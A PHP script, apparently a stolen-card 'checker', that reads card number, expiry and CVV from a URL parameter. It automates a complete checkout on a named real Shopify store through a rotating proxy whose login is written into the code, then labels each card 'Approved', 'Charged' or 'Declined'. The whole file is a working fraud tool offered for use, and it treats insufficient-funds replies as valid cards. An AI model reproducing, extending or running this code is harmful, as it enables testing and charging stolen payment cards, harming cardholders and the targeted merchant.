<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
include "CurlX.php";

// Read CC details from GET request
$cc = isset($_GET['cc']) ? $_GET['cc'] : '';
$use_proxy = isset($_GET['use_proxy']) ? filter_var($_GET['use_proxy'], FILTER_VALIDATE_BOOLEAN) : false;

// Check if $cc is provided
if (empty($cc)) {
    echo json_encode(["status" => "error", "message" => "CC details not provided"]);
    exit;
}

// Split the CC details
$cc_parts = explode('|', $cc);

// Validate that all necessary parts are present
if (count($cc_parts) < 4) {
    echo json_encode(["status" => "error", "message" => "Invalid CC details format"]);
    exit;
}

list($full_cc, $sub_mes, $yy, $cvv) = $cc_parts;

// Format the CC number for Shopify
$CC_Splited = substr($full_cc, 0, 4) . ' ' . substr($full_cc, 4, 4) . ' ' . substr($full_cc, 8, 4) . ' ' . substr($full_cc, 12, 4);

// Only last two digits of the year
$yy = substr($yy, -2);

// Proxy configuration
$PRX = null;
if ($use_proxy) {
    $PRX = [
        "METHOD" => "CUSTOM",
        "SERVER" => 'http://proxy.proxyverse.io:9200',
        "AUTH" => "country-us:3cfcde76-e7df-4966-82db-9520063e58d3"
    ];
}
$cookie = uniqid();
$URLBase = "japanwithlovestore.com";

// 1st Request: Capture Token & URL
$URL = "https://".$URLBase."/cart/42577480581378:1";
$R = (CurlX::Get($URL, NULL, $cookie, $PRX)->body);
$tk = CurlX::ParseString($R, 'authenticity_token" value="', '"');
$url = CurlX::ParseString($R, 'action="', '"');

// 2nd Request: Post Information, and Capture Token
$URL = "https://".$URLBase.$url;
$PostData = "_method=patch&authenticity_token=$tk&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D=username%40gmail.com&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bbuyer_accepts_marketing%5D=1&checkout%5Bshipping_address%5D%5Bfirst_name%5D=Faay&checkout%5Bshipping_address%5D%5Blast_name%5D=ANC&checkout%5Bshipping_address%5D%5Bcompany%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=1536+Stellar+Dr&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=Kenai&checkout%5Bshipping_address%5D%5Bcountry%5D=US&checkout%5Bshipping_address%5D%5Bprovince%5D=Alaska&checkout%5Bshipping_address%5D%5Bzip%5D=99611&checkout%5Bshipping_address%5D%5Bphone%5D=1234567890&checkout%5Bshipping_address%5D%5Bcountry%5D=United+States&checkout%5Bshipping_address%5D%5Bfirst_name%5D=Faay&checkout%5Bshipping_address%5D%5Blast_name%5D=ANC&checkout%5Bshipping_address%5D%5Bcompany%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=1536+Stellar+Dr&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=Kenai&checkout%5Bshipping_address%5D%5Bprovince%5D=AK&checkout%5Bshipping_address%5D%5Bzip%5D=99611&checkout%5Bshipping_address%5D%5Bphone%5D=1234567890&checkout%5Bbuyer_accepts_sms%5D=0&checkout%5Bsms_marketing_phone%5D=&checkout%5Bclient_details%5D%5Bbrowser_width%5D=604&checkout%5Bclient_details%5D%5Bbrowser_height%5D=661&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=360";
$R = (CurlX::Post($URL, $PostData, NULL, $cookie, $PRX)->body);
sleep(4); // This is for wait Shipping RATES

// 3rd Request: Get Shipping Rate + Token
$R = CurlX::Get($URL, NULL, $cookie, $PRX)->body;
$tk = CurlX::ParseString($R, 'authenticity_token" value="', '"');
$Sh = urlencode(CurlX::ParseString($R, 'data-shipping-method="', '"'));

// 4th Request: Post Shipping, Capture Token and Total
$PostData = "_method=patch&authenticity_token=$tk&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D=$Sh&checkout%5Bclient_details%5D%5Bbrowser_width%5D=604&checkout%5Bclient_details%5D%5Bbrowser_height%5D=661&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=360";
$R = (CurlX::Post($URL, $PostData, NULL, $cookie, $PRX)->body);
$tk = CurlX::ParseString($R, 'authenticity_token" value="', '"');
$final = CurlX::ParseString($R, 'data-checkout-payment-due-target="', '"');
$PaymentGate = CurlX::ParseString($R, 'payment_gateway_', '"');

// 5th Request: Create Shopify ID Token
$SH = "https://deposit.us.shopifycs.com/sessions";
$name = 'DefaultName';
$last = 'DefaultLast';
$PostData = '{"credit_card":{"number":"'.$CC_Splited.'","name":"'.$name.' '.$last.'","month":'.$sub_mes.',"year":'.$yy.',"verification_value":"'.$cvv.'"},"payment_session_scope":"'.$URLBase.'"}';
$ID = CurlX::ParseString(CurlX::Post($SH, $PostData, ["Content-Type: application/json"], $cookie, $PRX)->body, 'id":"', '"');

// 6th Request: Submit Payment
$PostData = "_method=patch&authenticity_token=$tk&previous_step=payment_method&step=&s=$ID&checkout%5Bpayment_gateway%5D=$PaymentGate&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Btotal_price%5D=$final&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1366&checkout%5Bclient_details%5D%5Bbrowser_height%5D=643&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=420&checkout%5Battributes%5D%5Bzip-mfpp-amount%5D=0";
$R = (CurlX::Post($URL, $PostData, NULL, $cookie, $PRX)->body);
sleep(7); // This is for processing payment and getting response

// 7th Request: Get Response Page + Capture it
$URL = "https://".$URLBase.$url."/processing?from_processing_page=1";
$R = (CurlX::Get($URL, NULL, $cookie, $PRX)->body);
$Response = CurlX::ParseString($R, '<p class="notice__text">', '</p>');

// Verify Responses
if (strpos($R, 'Thank you for your purchase!') !== false || strpos($R, 'You’ll receive a confirmation email with your order number shortly.') !== false || strpos($R, 'Thank you! -') !== false || strpos($R, 'You can find your order number in the receipt you received via email.') !== false) {
    $Response = "Charged";
    $Status = "Approved Card";
} elseif (strpos($R, "Address not Verified - Approved") !== false || strpos($R, "Insufficient Funds") !== false) {
    $Status = "Approved Card";
} else {
    $Status = "Declined Card";
}

// Print Responses in Pretty Format
echo "<pre>";
echo "CC Details: $cc\n";
echo "CC Formatted: $CC_Splited\n";
echo "Month: $sub_mes\n";
echo "Year: $yy\n";
echo "CVV: $cvv\n\n";

echo "Response: $Response\n";
echo "Status: $Status\n";
echo "</pre>";
?>